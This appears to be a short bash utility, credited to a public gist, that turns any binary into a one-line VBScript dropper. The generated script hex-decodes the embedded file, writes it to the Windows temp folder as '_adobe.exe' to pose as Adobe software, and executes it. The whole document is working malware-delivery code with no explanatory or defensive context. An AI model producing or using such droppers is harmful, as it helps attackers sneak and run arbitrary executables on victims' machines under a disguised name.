# stolen from https://gist.github.com/infosecn1nja/ed136c8d4f4e4c2580f96d58cbdabf7d
#!/bin/bash
convert2hex=$(xxd -p $1)
result=$(echo $convert2hex | sed s'/ //g')
echo 'Function n(s,c):n=String(s,c):End Function:t=t&"'$result'":Set s=CreateObject("Scripting.FileSystemObject"):p=s.getspecialfolder(2) & "_adobe.exe":Set f=s.CreateTextFile(p,1):for i=1 to len(t) step 2:f.Write Chr(int("&H" & mid(t,i,2))):next:f.Close:WScript.CreateObject("WScript.Shell").run(p)'
